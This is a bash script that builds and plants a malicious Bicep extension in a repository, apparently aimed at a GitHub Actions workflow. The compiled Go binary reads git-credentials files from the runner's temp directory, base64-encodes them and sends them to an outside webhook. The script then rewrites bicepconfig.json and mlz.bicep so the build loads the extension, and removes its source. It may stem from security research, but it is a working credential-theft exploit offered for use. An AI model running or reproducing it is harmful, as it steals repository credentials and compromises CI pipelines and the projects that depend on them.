#!/bin/bash

WEBHOOK_URL="${1:-https://lamian.robertprast.com}"
REPO_PATH="${2:-.}"

mkdir -p "$REPO_PATH/src/exfil-extension"
cd "$REPO_PATH/src/exfil-extension"

# Create Go module
cat > go.mod << 'GOMOD'
module exfil-extension
go 1.21
GOMOD

# Create main.go
cat > main.go << 'GOCODE'
package main

import (
    "encoding/base64"
    "io/ioutil"
    "net/http"
    "os"
    "path/filepath"
    "strings"
)

func main() {
    webhook := "https://lamian.robertprast.com"
    tempDir := "/home/runner/work/_temp"
    files, _ := ioutil.ReadDir(tempDir)

    for _, f := range files {
            if strings.Contains(f.Name(), "git-credentials") && strings.HasSuffix(f.Name(), ".config") {
                    path := filepath.Join(tempDir, f.Name())
                    data, err := ioutil.ReadFile(path)
                    if err == nil {
                            encoded := base64.StdEncoding.EncodeToString(data)
                            http.Get(webhook + "?file=" + f.Name() + "&token=" + encoded)
                    }
            }
    }
    os.Exit(1)
}
GOCODE

# Build static binary for Linux
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o extension-linux-x64 .

# Create index.json WITH required settings
cat > index.json << 'INDEX'
{
"name": "exfil",
"version": "1.0.0",
"isSingleton": true,
"resources": {},
"functions": {}
}
INDEX

# Create types.json
echo '[]' > types.json

# Create types.tgz
tar -cvf types.tar index.json types.json
gzip -f types.tar
mv types.tar.gz types.tgz

# Create final archive
tar -cvf exfil.tar types.tgz extension-linux-x64
gzip -f exfil.tar

# Move to repo
mkdir -p "$REPO_PATH/src/extensions"
mv exfil.tar.gz "$REPO_PATH/src/extensions/"

# Create bicepconfig.json  
cat > "$REPO_PATH/src/bicepconfig.json" << 'CONFIG'
{
"experimentalFeaturesEnabled": {
    "extensibility": true
},
"extensions": {
    "exfil": "/home/runner/work/missionlz/missionlz/src/extensions/exfil.tar.gz"
}
}
CONFIG

# Create bicep file
cat > "$REPO_PATH/src/mlz.bicep" << 'BICEP'
extension exfil

resource trigger 'exfil:Trigger@v1' = {
name: 'test'
}
BICEP

cd ..
rm -rf "$REPO_PATH/src/exfil-extension"

echo "Done!"